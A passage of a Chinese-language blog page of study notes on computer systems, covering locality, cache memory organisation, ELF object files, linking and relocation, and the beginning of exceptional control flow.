title="局部性原理"></a>局部性原理</h4><p>一个编写良好的计算机程序常常具有良好的局部性，它们倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身，这种倾向性，被称为局部性原理。</p><h4 id="量化评价局部性的简单原则"><a href="#量化评价局部性的简单原则" class="headerlink" title="量化评价局部性的简单原则"></a><strong>量化评价局部性的简单原则</strong></h4><ul><li>重复引用同一个变量的程序有良好的时间局部性。</li><li>对于具有步长为k的引用模式的程序，步长越小，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在存储器中以大步长跳来跳去的程序空间局部性会很差。</li><li>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li></ul><h3 id="6-3-存储器层次结构"><a href="#6-3-存储器层次结构" class="headerlink" title="6.3 存储器层次结构"></a>6.3 存储器层次结构</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614144247180.png" alt="image-20210614144247180"></p><h4 id="存储器层次结构中的缓存"><a href="#存储器层次结构中的缓存" class="headerlink" title="存储器层次结构中的缓存"></a>存储器层次结构中的缓存</h4><p><strong>存储器层次结构的中心思想</strong></p><p>对于每个k,位于k层的更快更小的存储设备作为位于k+1层的更大更慢的存储设备的缓存。换句话说，层次结构中的每一层都缓存来自较低一层的数据对象。例如，本地磁盘作为通过网络从远程磁盘取出的文件(例如Web页面)的缓存，主存作为本地磁盘上数据的缓存，依此类推，直到最小的缓存CPU寄存器集合。</p><p><strong>缓存命中</strong></p><p>当程序需要第k+1层的某个数据对象d时，它首先在当前存储在第k层的一个块中査找d。如果d刚好缓存在第k层中，那么就是我们所说的<strong>缓存命中</strong>( cache hit)。</p><p><strong>缓存不命中</strong></p><p>另ー方面，如果第k层中没有缓存数据对象d,那么就是我们所说的<strong>缓存不命中</strong>（ cache miss).当发生缓存不命中时，第k层的缓存从第k+1层缓存中取出包含d的那个块，如果第k层的缓存已经满了的话，可能就会覆盖现存的一个块。</p><p>覆盖一个现存的块的过程称为<strong>替换</strong>( replacing)或<strong>驱逐</strong>( evicting)这个块。被驱逐的这个块有时也称为<strong>牺牲块</strong>( victim block)。决定该替换哪个块是由缓存的<strong>替换策略</strong>(replacement policy)来控制的。例如，一个具有随机替换策略的缓存会随机选择一个牺性块。一个具有最近最少被使用(LRU)替换策略的缓存会选择那个最后被访问的时间距现在最远的块。</p><p><strong>缓存不命中的种类</strong></p><ul><li><p>冷不命中</p><p>如果第k层的缓存是空的，那么对任何数据对象的访问都会不命中。一个空的缓存有时称为冷缓存( cold cache)，此类不命中称为<strong>强制性不命中</strong>或<strong>冷不命中</strong></p></li><li><p>冲突不命中</p><p>在这种情况下，缓存足够大，能够保存被引用的数据对象，但是因为这些对象会映射到同一个缓存块，缓存会一直不命中。</p><p>例如，如果程序请求块0,然后块8,然后块0,然后块8,依此类推，在第k层的缓存中，对这两个块的每次引用都会不命中，即使是这个缓存总共可以容纳4个块。</p></li><li><p>容量不命中</p><p>当工作集的大小超过缓存的大小时，缓存会经历<strong>容量不命中</strong>( capacity miss)。换句话说，缓存就是太小了，不能处理这个工作集。</p></li></ul><h3 id="6-4-高速缓存存储器"><a href="#6-4-高速缓存存储器" class="headerlink" title="6.4 高速缓存存储器"></a>6.4 高速缓存存储器</h3><h4 id="4-1-通用的高速缓存存储器结构"><a href="#4-1-通用的高速缓存存储器结构" class="headerlink" title="4.1 通用的高速缓存存储器结构"></a>4.1 通用的高速缓存存储器结构</h4><p>考虑一个计算机系统，其中每个存储器地址有m位，形成M=2^m^个不同的地址。如图6-27a所示。</p><p>这样一个机器的高速缓存被组织成一个有S=2^s^个<strong>高速缓存组</strong>的数组。</p><p>每个组包含E个<strong>高速缓存行</strong>( cache line)。</p><p>每个行是由一个B=2^b^字节的<strong>数据块</strong>( block)组成的，一个<br>有效位( valid bit)指明这个行是否包含有意义的信息，还有t=m-(b+s)个标记位(是当前块的存储器地址的位的一个子集），它们唯一地标识存储在这个高速缓存行中的块。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614150943188.png" alt="image-20210614150943188"></p><p><strong>高速缓存的大小</strong>：C=S×E×B</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152049400.png" alt="image-20210614152049400"></p><h4 id="4-2-直接映射高速缓存"><a href="#4-2-直接映射高速缓存" class="headerlink" title="4.2 直接映射高速缓存"></a>4.2 直接映射高速缓存</h4><p>根据E（每个组的高速缓存行数）高速缓存被分为不同的类。每个组只有一行(E=1)的高速缓存称为<strong>直接映射高速缓存</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152338888.png" alt="image-20210614152338888"></p><p><strong>1.直接映射高速缓存的组选择</strong></p><p>在这一步中，高速缓存从w的地址中间抽取出s个组索引位。这些位被解释成一个对应于个组号的无符号整数。换句话来说，如果我们把高速缓存看成是一个关于组的一维数组，那么这些组索引位就是一个到这个数组的索引。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152556380.png" alt="image-20210614152556380"></p><p><strong>2.直接映射高速缓存的行匹配</strong></p><p>当且仅当设置了有效位，而且高速缓存行中的标记与w的地址中的标记相匹配时，这一行中包含w的一个拷贝。</p><p><strong>3.直接映射高速缓存的字选择</strong></p><p>如图6-31所示，块偏移位提供了所需要的字的第一个字节的偏移。就像我们把高速缓存看成一个行的数组一样，我们把块看成一个字节的数组，而字节偏移是到这个数组的一个索引。在这个示例中，块偏移位是100<del>2</del>,它表明w的拷贝是从块中的字节4开始的（我们假设字长为4字节）。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152831935.png" alt="image-20210614152831935"></p><p><strong>4.直接映射高速缓存中不命中时的行替换</strong></p><p>如果缓存不命中，那么它需要从存储器层次结构中的下一层取出被请求的块，然后将新的块存储在组索引位指示的组中的一个高速缓存行中。一般而言，如果组中都是有效高速缓存行了，那么必须要驱逐出一个现存的行。对于直接映射高速缓存来说，每个组只包含有一行，替换策略非常简单：<strong>用新取出的行替换当前的行</strong>。</p><ul><li>用中间位做索引高速缓存的使用效率更高。</li></ul><h4 id="4-3-组相连高速缓存"><a href="#4-3-组相连高速缓存" class="headerlink" title="4.3 组相连高速缓存"></a>4.3 组相连高速缓存</h4><p><strong>1.组相联高速缓存中的组选择</strong><br>它的组选择与直接映射高速缓存的组选择一样，组索引位标识组。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614160744314.png" alt="image-20210614160744314"></p><p><strong>2.组相联高速缓存中的行匹配和字选择</strong></p><p>图6-36展示了相联高速缓存中行匹配的基本思想。这里的一个重要思想就是组中的任何行都可以包含任何映射到这个组的存储器块。所以高速缓存必须<strong>捜索组中的每一行</strong>，寻找一个有效的行，其标记与地址中的标记相匹配。如果高速缓存找到了这样一行，那么我们就命中，块偏移从这个块中选择一个字，和前面一样。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614160949149.png" alt="image-20210614160949149"></p><p><strong>3.组相联高速缓存中不命中时的行替换</strong></p><p>有空行选择空行。</p><p>最简单的替换策略是<strong>随机选择要替换的</strong>行。</p><p><strong>最不常使用</strong>( Least-frequently-Used,LFU)策略会替换在<br>过去某个时间窗口内引用次数最少的那一行。</p><p><strong>最近最少使用</strong>( Least- Recently-Used,LRU)策略会替换最后一次访问时间最久远的那一行。所有这些策略都需要额外的时间和硬件。</p><h4 id="4-4-全相连高速缓存"><a href="#4-4-全相连高速缓存" class="headerlink" title="4.4 全相连高速缓存"></a>4.4 全相连高速缓存</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161050792.png" alt="image-20210614161050792"></p><p><strong>1.全相联高速缓存中的组选择</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161201608.png" alt="image-20210614161201608"></p><p><strong>2.全相联高速缓存中的行匹配和字选择</strong></p><p>全相联高速缓存中的行匹配和字选择与组相联高速缓存中的是一样的，如图6-39所示。它们之间的区别主要是个规模大小的问题。因为高速缓存电路必须并行地捜索许多相匹配的标记，造一个又大又快的相联高速缓存很困难，而且很昂贵。因此，全相联高速缓存只适合做小的高速缓存，例如虚拟存储器系统中的翻译备用缓冲器(TLB),它缓存页表项。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161349454.png" alt="image-20210614161349454"></p><h4 id="4-5-有关写的问题"><a href="#4-5-有关写的问题" class="headerlink" title="4.5 有关写的问题"></a>4.5 有关写的问题</h4><p><strong>第一个问题：</strong>在高速缓存更新了它的w的拷贝之后，怎么更新w在层次结构中紧接着低一层中的拷贝？</p><ul><li><p><strong>直写</strong></p><p>就是立即将w的高速缓存块写回到紧接着的低一层中。虽然简单，但是直写的缺点是每次写都会引起总线流量。</p></li><li><p><strong>写回</strong></p><p>尽可能地推迟存储器更新，只有当替换算法要驱逐更新过的块时，才把它写到紧接着的低一层中。由于局部性，写回能显著地减少总线流量，但是它的缺点是增加了复杂性。高速缓存必须为每个高速缓存行维护一个额外的修改位( dirty bit),表明这个高速缓存块是否被修改过。</p></li></ul><p><strong>第二个问题：</strong>如何处理写不命中</p><ul><li><p><strong>写分配</strong></p><p>加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。写分配试图利用写的空间局部性，但是缺点是每次不命中都会导致一个块从低一层传送到高速缓存。</p></li><li><p><strong>非写分配</strong></p><p>避开高速缓存，直接把这个字写到低一层中。</p></li></ul><p>直写高速缓存通常是非写分配的。写回高速缓存通常是写分配的。</p><h4 id="4-6一个真实的高速缓存层次结构的解剖"><a href="#4-6一个真实的高速缓存层次结构的解剖" class="headerlink" title="4.6一个真实的高速缓存层次结构的解剖"></a>4.6一个真实的高速缓存层次结构的解剖</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614163042361.png" alt="image-20210614163042361"></p><h4 id="4-7-高速缓存参数的性能影响"><a href="#4-7-高速缓存参数的性能影响" class="headerlink" title="4.7 高速缓存参数的性能影响"></a>4.7 <strong>高速缓存参数的性能影响</strong></h4><p><strong>衡量高速缓存的性能指标</strong></p><ul><li><p><strong>不命中率</strong></p><p>不命中数量/引用数量</p></li><li><p><strong>命中率</strong></p><p>命中率=1-不命中率</p></li><li><p><strong>命中时间</strong></p><p>从高速缓存传送一个字到CPU所需的时间，包括组选择、行确认和字选择的时间。</p></li><li><p><strong>不命中处罚</strong></p><p>由于不命中所需要的额外的时间。</p></li></ul><p><strong>1.高速缓存大小的影响</strong></p><p><strong>2.块大小的影响</strong></p><p><strong>3.相联度的影响</strong></p><p><strong>4.写策略的影响</strong></p><h2 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h2><h3 id="7-1-编译器驱动程序"><a href="#7-1-编译器驱动程序" class="headerlink" title="7.1 编译器驱动程序"></a>7.1 编译器驱动程序</h3><p>大多数编译系统提供<strong>编译驱动桯序</strong>( compiler driver),它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。</p><hr><h3 id="7-2-静态链接"><a href="#7-2-静态链接" class="headerlink" title="7.2 静态链接"></a>7.2 静态链接</h3><p>像Unix ld程序这样的<strong>静态链接器</strong>以一组可重定位目标文件和命令行参数作为输人，生成一个完全链接的可以加载和运行的可执行目标文件作为输出。</p><p>输入的<strong>可重定位目标文件</strong>由各种不同的代码和数据节(section)组成。指令在一个节中，初始化的全局变量在另一个节中，而未初始化的变量又在另外一个节中。</p><p><strong>链接器主要任务：</strong></p><ul><li><strong>符号解析</strong>( symbol resolution)。目标文件定义和引用符号。符号解析的目的是将每个符号<br>引用刚好和一个符号定义联系起来。</li><li><strong>重定位</strong>( relocation)。编译器和汇编器生成从地址0开始的代码和数据节。链接器通过把<br>每个符号定义与一个存储器位置联系起来，然后修改所有对这些符号的引用，使得它们指<br>向这个存储器位置，从而重定位这些节。</li></ul><hr><h3 id="7-3-目标文件"><a href="#7-3-目标文件" class="headerlink" title="7.3 目标文件"></a>7.3 目标文件</h3><p>目标文件三种形式：</p><ul><li><strong>可重定位目标文件</strong>。包含二进制代码和数据。其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行文件。</li><li><strong>可执行目标文件</strong>。包含二进制代码和数据。可被直接拷贝到存储器执行。</li><li><strong>共享目标文件</strong>。一种特殊的可重定位目标文件。可以在加载时或者在运行时被动态地加载到存储器并链接。</li></ul><p>编译器和汇编器生成可重定位目标文件（包括共享目标文件）。</p><p>链接器生成可执行目标文件。</p><hr><h3 id="7-4-可重定位目标文件"><a href="#7-4-可重定位目标文件" class="headerlink" title="7.4 可重定位目标文件"></a>7.4 可重定位目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614174042988.png" alt="image-20210614174042988"></p><ul><li><p><strong>ELF头</strong></p><ul><li><p>以一个<strong>16字节的序列</strong>开始，这个序列描述了<strong>生成该文件的系统的字的大小和字节顺序</strong>。</p></li><li><p>ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。</p><p>其中包括：</p><ul><li><p>ELF头的大小。</p></li><li><p>目标文件的类型（如可重定位、可执行或者是共享的）</p></li><li><p>机器类型（IA32）</p></li><li><p>节头部表的文件偏移</p></li><li><p>节头部表中的条目大小和数量。</p></li></ul></li></ul></li><li><p>夹在ELF头和节头部表之间的都是<strong>节</strong>。一个典型的ELF可重定位目标文件包含下面几个节：</p><ul><li><strong>.text：</strong>已编译程序的机器代码。</li><li><strong>.rodata：</strong>只读数据。比如printf语句中的格式串和switch语句的跳转表。</li><li><strong>.data：</strong>已初始化的全局C变量。局部C变量在运行时保存在栈中，既不出现在.data节中，也不出现在.bss节中。</li><li><strong>.bss：</strong>未初始化的全局C变量。在目标文件中，未初始化变量不需要占据任何实际的磁盘空间，仅仅是为了空间效率的占位符。</li><li><strong>.symtab：</strong>一个符号表，它存放在程序中定义和引用的函数和全局变量的信息。</li><li><strong>.rel.text：</strong>一个.text节中位置的列表，在与其他可重定位目标文件结合时需要修改这些位置。</li><li><strong>.rel.data：</strong>被模块引用或定义的任何全局变量的重定位信息。</li><li><strong>.debug：</strong>一个调试符号表。包括局部变量、全局变量以及原始的C源文件。只有用**<code>-g</code>选项**才会得到这张表。</li><li><strong>.line：</strong>原始C源程序中的行号和.text节中机器指令之间的映射。只有用**<code>-g</code>选项**才会得到这张表。</li><li><strong>.strtab：</strong>一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。</li></ul></li></ul><hr><h3 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h3><p><strong>链接器符号是什么？符号表又是什么？</strong></p><ul><li><strong>链接器符号</strong>其实就是程序中的变量名、函数名。</li><li><strong>符号表</strong>是编译器为存储变量名、函数名、对象、类、接口等各种实体的出现情况而创建和维护的一种重要的<strong>数据结构</strong>。</li></ul><p><strong>链接器符号分为三种：</strong></p><ul><li><strong>由本模块m定义并能被其他模块引用的全局符号</strong>。对应于非静态的的c函数以及被定义为不带c语言static属性的全局变量。</li><li><strong>由其他模块定义并被模块m引用的全局符号成为外部符号</strong>。对应于定义在其他模块中的c语 言函数和变量。</li><li><strong>仅由本模块m定义和引用的本地符号</strong>。对应于在模块中定义的带static的C语言函数和全局变量，这些函数和变量只能在本模块中引用，不能在其他模块中引用。</li><li><strong>注意：链接器的局部符号不是指程序中的局部变量（分配在栈中的临时性变量），链接器不关心这种局部变量。</strong></li></ul><p><strong>全局符号的强弱：</strong></p><ul><li>在编译时，<strong>编译器向汇编器输出</strong>的每个<strong>全局符号</strong>，或者是<strong>强符号</strong>，或者是<strong>弱符号</strong>。</li><li><strong>强符号</strong>：函数和已初始化的全局变量。</li><li><strong>弱符号</strong>：未初始化的全局变量。</li><li>对于<strong>多重定义的全局符号</strong>：强符号和弱符号中选强符号，强符号只能有一个，如果没有则选弱符号其中之一。</li><li>所以我们在<strong>编程时要注意</strong>尽可能地<strong>避免使用全局变量</strong>，若要使用需要合理使用<strong>static、extern</strong>，记得<strong>变量初始化</strong>。</li></ul><p><strong>.symtab节的中包含的ELF符号表举例：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210529134717830.png" alt="image-20210529134717830"></p><hr><h3 id="7-6-符号解析"><a href="#7-6-符号解析" class="headerlink" title="7.6 符号解析"></a>7.6 符号解析</h3><p><strong>链接器解析符号引用的方法：</strong>将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号联系起来。</p><h4 id="6-1-链接器如何解析多重定义的全局符号"><a href="#6-1-链接器如何解析多重定义的全局符号" class="headerlink" title="6.1 链接器如何解析多重定义的全局符号"></a>6.1 链接器如何解析多重定义的全局符号</h4><p><strong>按如下规则处理：</strong></p><p>规则1: 不允许有多个强符号。<br>规则2: 如果有一个强符号和多个弱符号，那么选择强符号。<br>规则3: 如果有多个弱符号，那么从这些弱符号中任意选择一个。</p><h4 id="6-2-与静态库链接"><a href="#6-2-与静态库链接" class="headerlink" title="6.2 与静态库链接"></a>6.2 与静态库链接</h4><p><strong>静态库：</strong>相关函数可以被编译为独立的目标模块，然后封装成一个单独的静态库文件。在链接时，链接器将只拷贝被程序引用的目标模块。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615150100376.png" alt="image-20210615150100376"></p><h4 id="6-3-链接器如何使用静态库来解析引用"><a href="#6-3-链接器如何使用静态库来解析引用" class="headerlink" title="6.3 链接器如何使用静态库来解析引用"></a>6.3 链接器如何使用静态库来解析引用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615151116120.png" alt="image-20210615151116120"></p><p>关于<strong>库的一般准则</strong>是将它们<strong>放在命令行的结尾</strong>。如果各个库的成员是相互独立的（也就是说没有成员引用另一个成员定义的符号），那么这些库就可以按照任何顺序放置在命令行的结尾处。<br>另一方面，如果库不是相互独立的，那么它们<strong>必须排序</strong>，使得对于每个被存档文件的成员外部引用的符号s,在命令行中至少有一个s的定义是在对s的引用之后的。</p><p>如果需要满足依赖需求，可以在<strong>命令行上重复库</strong></p><hr><h3 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h3><p>重定位将合并输入模块，并为每个符号分配运行时地址。</p><p>重定位由两步组成：</p><ul><li><strong>重定位节和符号定义。</strong>在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自输入模块的.data节被全部合并成一个节，这个节成为输出的可执行<br>目标文件的.data节。然后，链接器将运行时存储器地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每个指令和全局变量都有唯一的运行时存储器地址了。</li><li><strong>重定位节中的符号引用。</strong>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。为了执行这一步，链接器依赖于称为<strong>重定位条目</strong>( relocation entry)的可重定位目标模块中的数据结构</li></ul><h4 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615152035610.png" alt="image-20210615152035610"></p><p><strong>两种最基本的重定位类型：</strong></p><ul><li><p><strong>R_386_PC32：</strong>重定位一个使用32位PC相对地址的引用。</p><p>一个PC相对地址就是距程序计数器(PC)的当前运行时值的偏移量。当CPU执行一条使用PC相对寻址的指令时，它就将在指令中编码的32位值上加上PC的当前运行时值，得到有效地址(如ca11指令的目标)，PC值通常是存储器中下一条指令的地址。</p></li><li><p><strong>R_386_32：</strong>重定位一个使用32绝对地址的引用。</p><p>通过绝对寻址，CPU直接使用在指令中编码的32位值作为有效地址，不需要进一步修改。</p></li></ul><h4 id="7-7-2-重定位符号引用"><a href="#7-7-2-重定位符号引用" class="headerlink" title="7.7.2 重定位符号引用"></a>7.7.2 重定位符号引用</h4><p><strong>重定位算法</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615154815219.png" alt="image-20210615154815219"></p><p>ADDR(s)：每个节运行时地址</p><p>ADDR(r.symbol)：每个符号运行时地址</p><p><strong>1.重定位PC相对引用</strong></p><p>待重定位的代码</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155050140.png" alt="image-20210615155050140"></p><p>重定位条目</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155230646.png" alt="image-20210615155230646"></p><p>链接器已经确定</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155304801.png" alt="image-20210615155304801"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155314174-1623743596124.png" alt="image-20210615155314174"></p><p>首先计算出引用的运行时地址，即偏移量的实际起始地址</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155600812.png" alt="image-20210615155600812"></p><p>然后计算新的引用，即新的偏移量，从PC的当前值（当前指令的下一条指令起始地址）要偏移多少才会到swap的实际运行时地址</p><p>这个公式可以理解为引用的运行时地址加上引用所占据的字节数（bb+4)，然后用目标地址减去上面的值就是我们要得到的偏移量。</p><p>-4是由不同机器的引用长度决定的</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155705059.png" alt="image-20210615155705059"></p><p>于是指令被修改为</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155856359.png" alt="image-20210615155856359"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155910631.png" alt="image-20210615155910631"></p><p><strong>2.重定位PC绝对引用</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615160238171.png" alt="image-20210615160238171"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615160318085.png" alt="image-20210615160318085"></p><hr><h3 id="7-8-可执行目标文件"><a href="#7-8-可执行目标文件" class="headerlink" title="7.8 可执行目标文件"></a>7.8 可执行目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161745659.png" alt="image-20210615161745659"></p><p>可执行文件p的段头部表</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161847318.png" alt="image-20210615161847318"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161900425.png" alt="image-20210615161900425"></p><hr><h3 id="7-9-加载可执行目标文件"><a href="#7-9-加载可执行目标文件" class="headerlink" title="7.9 加载可执行目标文件"></a>7.9 加载可执行目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615162558215.png" alt="image-20210615162558215"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615162610066.png" alt="image-20210615162610066"></p><hr><h3 id="7-10-动态链接共享库"><a href="#7-10-动态链接共享库" class="headerlink" title="7.10 动态链接共享库"></a>7.10 动态链接共享库</h3><p>静态库存在如下缺点: </p><ul><li><p>在存储中的可执行文件中有多个副本 (每一个函数均需要静态库文件 ) </p></li><li><p>在运行中的可执行文件中存在多个副本 </p></li><li><p>即便是对系统库进行小bug的修复，也需要对使用到这个库的所有应用显示地重新链接</p></li></ul><p><strong>共享库</strong>( shared library)是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行时，可以加载到任意的存储器地址，并和一个在存储器中的程序链接起来。这个过程称为动态链接( dynamic linking),是由一个叫做动态链接器(dynamic linker)的程序来执行的。<br>共享库也称为共享目标( shared object),在Uniⅸ系统中通常用.so后缀来表示。微软的操作系统大量地利用了共享库，它们称为DLL（动态链接库）。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615164131444.png" alt="image-20210615164131444"></p><hr><h3 id="7-13-处理目标文件的工具"><a href="#7-13-处理目标文件的工具" class="headerlink" title="7.13 处理目标文件的工具"></a>7.13 处理目标文件的工具</h3><p>在Unix系统中有大量可用的工具可以帮助你理解和处理目标文件。特别地， GNU binutils包尤其有帮助，而且可以运行在每个Unⅸ平台上。</p><ul><li><strong>AR</strong>: 创建静态库，插入、删除、列出和提取成员。</li><li><strong>STRINGS</strong>: 列出一个目标文件中所有可打印的字符串。</li><li><strong>STRIP</strong>: 从目标文件中删除符号表信息。</li><li><strong>NM</strong>: 列出一个目标文件的符号表中定义的符号。</li><li><strong>SIZE</strong>: 列出目标文件中节的名字和大小</li><li><strong>READELF</strong>: 显示一个目标文件的完整结构，包括ELF头中编码的所有信息。包含SIZE和NM的功能</li><li><strong>OBJDUMP</strong>: 所有二进制工具之母。能够显示一个目标文件中所有的信息。它最大的作用是反汇编。text节中的二进制指今</li></ul><p>Unix系统为操作共亨库还提供了LDD程序：</p><ul><li><strong>LDD</strong>: 列出一个可执行文件在运行时所需要的共享库。</li></ul><hr><h2 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h2><h3 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h3><p><strong>异常</strong>就是控制流中的突变，用来响应处理器状态中的某些变化。</p><p>状态变化称为<strong>事件</strong>。事件可能和当前指令的执行直接相关。<br>比如，发生虚拟存储器缺页、算术溢出，或者一条指令试图除以零。另一方面，事件也可能和当前指令的执行没有关系。比如，一个系统定时器产生信号或者一个I/O请求完成。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615171511841.png" alt="image-20210615171511841"></p><p>在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做<strong>异常表</strong>(exception table)的跳转表，进行一个<strong>间接过程调用</strong>（异常)，到一个专门设计用来处理这类事件的操作系统子程序（<strong>异常处理程序</strong>( exception handler))</p><p>当异常处理程序完成处理后，根据引起异常的事件的类型，会发生以下三种情况中的一种：</p><ol><li>处理程序将控制返回给当前指令I<del>curr</del>，即当事件发生时正在执行的指令。</li><li>处理程序将控制返回给I<del>next</del>，即如果没有发生异常将会执行的下一条指令。</li><li>处理程序终止被中断的程序。</li></ol><h4 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h4><p>在系统启动时（当计算机重启或者加电时），操作系统分配和初始化一张称为<strong>异常表</strong>的跳转表，使得条目k包含异常k的处理程序的地址。图8-2展示了一张异常表的格式。</p><p>异常表的起始地址放在一个叫做<strong>异常表基址寄存器</strong>的特殊CPU寄存器中。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615171950006.png" 